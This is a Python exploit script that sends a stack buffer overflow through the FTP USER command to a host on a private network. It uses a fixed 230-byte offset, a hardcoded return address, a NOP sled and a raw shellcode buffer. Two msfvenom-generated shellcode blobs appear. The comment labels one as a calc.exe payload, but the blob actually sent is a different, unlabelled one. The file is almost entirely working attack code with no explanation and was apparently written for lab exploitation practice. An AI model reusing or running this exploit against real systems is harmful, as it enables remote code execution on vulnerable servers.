#!/usr/bin/python3
import socket
ip = "192.168.1.76"

port = 21
timeout = 5
prefix = b"USER "
offset = 230
NOP = b"\x90" * 20
#0x77c35459
returnAdd = b"\xd7\x30\x9d\x7c"
#msfvenom -p windows/exec -b '\x00\x0a\x0d' -f python -v shellcode_calc CMD=calc.exe EXITFUNC=thread
buf =  b""
buf += b"\xb8\xb3\xbf\xbc\xd4\xda\xd6\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x83\xc7\x04\x31\x47\x0e\x03\xf4\xb1\x5e"
buf += b"\x21\x06\x25\x1c\xca\xf6\xb6\x41\x42\x13\x87\x41\x30"
buf += b"\x50\xb8\x71\x32\x34\x35\xf9\x16\xac\xce\x8f\xbe\xc3"
buf += b"\x67\x25\x99\xea\x78\x16\xd9\x6d\xfb\x65\x0e\x4d\xc2"
buf += b"\xa5\x43\x8c\x03\xdb\xae\xdc\xdc\x97\x1d\xf0\x69\xed"
buf += b"\x9d\x7b\x21\xe3\xa5\x98\xf2\x02\x87\x0f\x88\x5c\x07"
buf += b"\xae\x5d\xd5\x0e\xa8\x82\xd0\xd9\x43\x70\xae\xdb\x85"
buf += b"\x48\x4f\x77\xe8\x64\xa2\x89\x2d\x42\x5d\xfc\x47\xb0"
buf += b"\xe0\x07\x9c\xca\x3e\x8d\x06\x6c\xb4\x35\xe2\x8c\x19"
buf += b"\xa3\x61\x82\xd6\xa7\x2d\x87\xe9\x64\x46\xb3\x62\x8b"
buf += b"\x88\x35\x30\xa8\x0c\x1d\xe2\xd1\x15\xfb\x45\xed\x45"
buf += b"\xa4\x3a\x4b\x0e\x49\x2e\xe6\x4d\x06\x83\xcb\x6d\xd6"
buf += b"\x8b\x5c\x1e\xe4\x14\xf7\x88\x44\xdc\xd1\x4f\xaa\xf7"
buf += b"\xa6\xdf\x55\xf8\xd6\xf6\x91\xac\x86\x60\x33\xcd\x4c"
buf += b"\x70\xbc\x18\xc2\x20\x12\xf3\xa3\x90\xd2\xa3\x4b\xfa"
buf += b"\xdc\x9c\x6c\x05\x37\xb5\x07\xfc\xd0\x7a\x7f\xff\x21"
buf += b"\x13\x82\xff\x30\xbf\x0b\x19\x58\x2f\x5a\xb2\xf5\xd6"
buf += b"\xc7\x48\x67\x16\xd2\x35\xa7\x9c\xd1\xca\x66\x55\x9f"
buf += b"\xd8\x1f\x95\xea\x82\xb6\xaa\xc0\xaa\x55\x38\x8f\x2a"
buf += b"\x13\x21\x18\x7d\x74\x97\x51\xeb\x68\x8e\xcb\x09\x71"
buf += b"\x56\x33\x89\xae\xab\xba\x10\x22\x97\x98\x02\xfa\x18"
buf += b"\xa5\x76\x52\x4f\x73\x20\x14\x39\x35\x9a\xce\x96\x9f"
buf += b"\x4a\x96\xd4\x1f\x0c\x97\x30\xd6\xf0\x26\xed\xaf\x0f"
buf += b"\x86\x79\x38\x68\xfa\x19\xc7\xa3\xbe\x3a\x2a\x61\xcb"
buf += b"\xd2\xf3\xe0\x76\xbf\x03\xdf\xb5\xc6\x87\xd5\x45\x3d"
buf += b"\x97\x9c\x40\x79\x1f\x4d\x39\x12\xca\x71\xee\x13\xdf"
shellcode_calc =  b""
shellcode_calc += b"\xdb\xc7\xba\x88\x85\xf7\xbb\xd9\x74\x24"
shellcode_calc += b"\xf4\x5b\x29\xc9\xb1\x31\x31\x53\x18\x03"
shellcode_calc += b"\x53\x18\x83\xeb\x74\x67\x02\x47\x6c\xea"
shellcode_calc += b"\xed\xb8\x6c\x8b\x64\x5d\x5d\x8b\x13\x15"
shellcode_calc += b"\xcd\x3b\x57\x7b\xe1\xb0\x35\x68\x72\xb4"
shellcode_calc += b"\x91\x9f\x33\x73\xc4\xae\xc4\x28\x34\xb0"
shellcode_calc += b"\x46\x33\x69\x12\x77\xfc\x7c\x53\xb0\xe1"
shellcode_calc += b"\x8d\x01\x69\x6d\x23\xb6\x1e\x3b\xf8\x3d"
shellcode_calc += b"\x6c\xad\x78\xa1\x24\xcc\xa9\x74\x3f\x97"
shellcode_calc += b"\x69\x76\xec\xa3\x23\x60\xf1\x8e\xfa\x1b"
shellcode_calc += b"\xc1\x65\xfd\xcd\x18\x85\x52\x30\x95\x74"
shellcode_calc += b"\xaa\x74\x11\x67\xd9\x8c\x62\x1a\xda\x4a"
shellcode_calc += b"\x19\xc0\x6f\x49\xb9\x83\xc8\xb5\x38\x47"
shellcode_calc += b"\x8e\x3e\x36\x2c\xc4\x19\x5a\xb3\x09\x12"
shellcode_calc += b"\x66\x38\xac\xf5\xef\x7a\x8b\xd1\xb4\xd9"
shellcode_calc += b"\xb2\x40\x10\x8f\xcb\x93\xfb\x70\x6e\xdf"
shellcode_calc += b"\x11\x64\x03\x82\x7f\x7b\x91\xb8\xcd\x7b"
shellcode_calc += b"\xa9\xc2\x61\x14\x98\x49\xee\x63\x25\x98"
shellcode_calc += b"\x4b\x8b\xc7\x09\xa1\x24\x5e\xd8\x08\x29"
shellcode_calc += b"\x61\x36\x4e\x54\xe2\xb3\x2e\xa3\xfa\xb1"
shellcode_calc += b"\x2b\xef\xbc\x2a\x41\x60\x29\x4d\xf6\x81"
shellcode_calc += b"\x78\x2e\x99\x11\xe0\x9f\x3c\x92\x83\xdf"

buffer = b"A" * 230 + returnAdd + NOP + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))
resp = s.recv(1024)
print(resp)


s.send(prefix + buffer + b"\r\n")
resp = s.recv(1024)
print(resp)

s.close()	

